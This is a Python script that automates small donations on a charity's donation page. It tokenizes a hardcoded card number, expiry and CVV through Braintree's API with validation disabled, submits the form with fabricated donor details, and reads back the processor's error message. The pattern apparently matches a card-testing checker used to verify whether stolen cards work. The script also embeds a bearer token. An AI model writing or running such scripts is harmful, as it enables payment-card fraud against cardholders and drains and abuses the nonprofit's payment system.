import requests, uuid, json , base64


def find_between(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  
  
def main():

    session = requests.Session()

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-ES,es;q=0.8',
        'cache-control': 'max-age=0',
        'if-modified-since': 'Fri, 24 Apr 2026 23:19:07 GMT',
        'if-none-match': 'W/"1777072747"',
        'priority': 'u=0, i',
        'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
        # 'cookie': 'mc_lightbox=1',
    }

    response = session.get(
        'https://www.mercycorps.org/donate/join-us-now-your-support-saves-and-changes-lives',
        headers=headers,
    )

    headers = {
        'accept': '*/*',
        'accept-language': 'es-ES,es;q=0.8',
        'authorization': 'Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzcyMzcwNzYsImp0aSI6IjU1ZDU0Y2YwLWRjZGItNGYyOC1hYmQwLWNmZTRiYmQ0Nzg0ZCIsInN1YiI6InNqdmtianQ4MjVuazI0aGIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InNqdmtianQ4MjVuazI0aGIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7fX0.KxjfusoqAaEVfaywfvIc0iqpCfeCUd6zT6LcE1keo8-5Jb9Qx4kxqUxA5qZWrW5CMWaClaJBoIjfanIIipkQDA',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'sec-gpc': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': '4266841804356051',
                    'expirationMonth': '05',
                    'expirationYear': '2030',
                    'cvv': '170',
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()

    token = response['data']['tokenizeCreditCard']['token']

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-ES,es;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.mercycorps.org',
        'priority': 'u=0, i',
        'referer': 'https://www.mercycorps.org/',
        'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-site',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
    }

    data = [
        ('donation_type', 'single'),
        ('amount_other', '5'),
        ('action_in_honor_of_type', ''),
        ('action_in_honor_of_name', ''),
        ('action_in_honor_of_from', ''),
        ('action_in_honor_of_email', ''),
        ('action_in_honor_of_note', ''),
        ('payment_method', 'credit-card'),
        ('name', 'Oklahoma Evan Hicks'),
        ('email', 'example@gmail.com'),
        ('address1', 'Eason Rd 5460'),
        ('address2', 'Eason Rd 5460'),
        ('city', 'Phoenix'),
        ('region', 'Phoenix'),
        ('postal', '55573'),
        ('country', 'Dominican Republic'),
        ('phone', '9497674837'),
        ('action_phone_consent', '9497674837'),
        ('action_comment', ''),
        ('never_recognize', '1'),
        ('referer_from_url', '1'),
        ('paypal', '0'),
        ('page', 'donate_main'),
        ('action_fund_code', 'Where Most Needed'),
        ('action_nid', '3167'),
        ('action_apple_pay', '0'),
        ('action_google_pay', '0'),
        ('action_venmo', '0'),
        ('action_card_type', 'Visa'),
        ('payment_account', 'Braintree CSE'),
        ('processing_fee', '0.15'),
        ('net_total', '5.00'),
        ('required', 'email'),
        ('required', 'address1'),
        ('required', 'city'),
        ('required', 'country'),
        ('required', 'zip'),
        ('required', 'state'),
        ('required', 'donation_type'),
        ('action_monthly_nudge', '1'),
        ('action_drupal_url', '/donate/join-us-now-your-support-saves-and-changes-lives'),
        ('form_name', 'act'),
        ('url', 'https://www.mercycorps.org/donate/join-us-now-your-support-saves-and-changes-lives'),
        ('js', '1'),
        ('required', 'name'),
        ('required', 'first_name'),
        ('required', 'last_name'),
        ('selected_amount', 'amount_other'),
        ('action_donation_type', 'single'),
        ('action_ask_string', '50,75,150,500,1000'),
        ('payment_method_nonce', f'{token}'),
        ('card_prefix', '483560'),
    ]

    response = session.post('https://web.mercycorps.org/act/', headers=headers, data=data).text

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-ES,es;q=0.8',
        'cache-control': 'max-age=0',
        'priority': 'u=0, i',
        'referer': 'https://www.mercycorps.org/',
        'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-site',
        'sec-fetch-user': '?1',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
        # 'cookie': 'mc_lightbox=1',
    }

    params = {
        'action_apple_pay': '0',
        'action_ask_string': '50,75,150,500,1000',
        'action_card_type': 'Visa',
        'action_comment': '',
        'action_donation_type': 'single',
        'action_drupal_url': '/donate/join-us-now-your-support-saves-and-changes-lives',
        'action_fund_code': 'Where Most Needed',
        'action_google_pay': '0',
        'action_in_honor_of_email': '',
        'action_in_honor_of_from': '',
        'action_in_honor_of_name': '',
        'action_in_honor_of_note': '',
        'action_in_honor_of_type': '',
        'action_monthly_nudge': '1',
        'action_nid': '3167',
        'action_phone_consent': '9497674837',
        'action_venmo': '0',
        'address1': 'Eason Rd 5460',
        'address2': 'Eason Rd 5460',
        'amount_other': '5',
        'card_prefix': '483560',
        'city': 'Phoenix',
        'country': 'Dominican Republic',
        'donation_type': 'single',
        'email': 'example@gmail.com',
        'error_card_num:processor_error': "Sorry, your donation couldn't be processed.",
        'form_name': 'act',
        'js': '1',
        'name': 'Oklahoma Evan Hicks',
        'net_total': '5.00',
        'never_recognize': '1',
        'payment_account': 'Braintree CSE',
        'payment_method': 'credit-card',
        'payment_method_nonce': f'{token}',
        'paypal': '0',
        'phone': '9497674837',
        'postal': '55573',
        'prefill': '1',
        'processing_fee': '0.15',
        'referer_from_url': '1',
        'region': 'Phoenix',
        'selected_amount': 'amount_other',
    }

    response = session.get(
        'https://www.mercycorps.org/donate/join-us-now-your-support-saves-and-changes-lives',
        params=params,
        headers=headers,
    ).text

    processor_error = params.get('error_card_num:processor_error', 'No error parameter')
    print(processor_error)



main()